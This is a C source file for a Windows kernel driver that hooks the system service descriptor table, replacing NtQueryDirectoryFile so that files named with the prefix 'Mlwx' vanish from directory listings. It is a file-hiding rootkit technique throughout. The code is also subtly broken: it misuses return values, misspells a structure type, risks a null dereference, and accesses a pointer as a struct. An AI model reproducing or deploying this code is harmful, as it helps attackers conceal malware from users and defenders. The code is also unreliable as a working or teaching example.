#include <ntoskrnl.h>

WCHAR* api = L"NtQueryDirectoryFile";
WCHAR* ssdt = L"KeServiceDescriptorTable";
WCHAR* targetPrefix = L"Mlwx";

typedef struct _SSDT {
	PULONG Base;
	ULONG Count;
	ULONG Limit;
	//...
} SSDT;

typedef NTSTATUS(NTAPI* NtQueryDirectoryFile_t)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, \
		PVOID, ULONG, FILE_INFORMATION_CLASS, BOOLEAN, PUNICODE_STRING, BOOLEAN);
		
NtQueryDirectoryFile_t NtQueryDirectoryFile;
int ssdtIndex;

NTSTATUS NTAPI HookApi(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, 
	PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass,
	BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan){
		
		RestartScan = NtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext,
			IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry,
			FileName, RestartScan);
		// for some reason last parameter is holding return value 
		if (FileInformationClass != FileBothDirectoryInformation){
			return RestartScan;
		}
		if (ReturnSingleEntry){
			return RestartScan;
		}
		if (RestartScan != NT_SUCCESS){
			return RestartScan;
		}
		ULONG offset; 
		FILE_BOTH_DIR_INFROMATION* lastEntry = NULL;
		FILE_BOTH_DIR_INFROMATION* info = (FILE_BOTH_DIR_INFROMATION*)FileInformation;
		do {
			offset = info->NextEntryOffset;
			if (RtlCompareMemory(targetPrefix, &info->FileName, 8) == 8){
				if (!offset){
					lastEntry->NextEntryOffset = 0;
				}
				else {
					lastEntry->NextEntryOffset += offset;
				}
			}
			else {
				lastEntry = info;
			}
			if (!offset){
				break;
			}
			info = (char*)info + offset;	
		} while (TRUE);	
	return RestartScan;
		
}

NTSTATUS DriverEntry(PDRIVER_OBJECT,PUNICODE_STRING){
	UNICODE_STRING strApi;
	UNICODE_STRING strSsdt;
	RtlInitUnicodeString(&strApi, api);
	RtlInitUnicodeString(&strSsdt, ssdt);
	SSDT* _ssdt;
	
	_ssdt = (SSDT*)MmGetSystemRoutineAddress(&strSsdt);
	NtQueryDirectoryFile = (NtQueryDirectoryFile_t)MmGetSystemRoutineAddress(&strApi);
	int i;
	for (i = 0; i < _ssdt.Limit; i++){
		if (_ssdt.Base[i] == (ULONG)NtQueryDirectoryFile){
			break;
		}
	}
	ssdtIndex = i;
	_ssdt.Base[i] = (ULONG)HookApi;
	return STATUS_SUCCESS;
}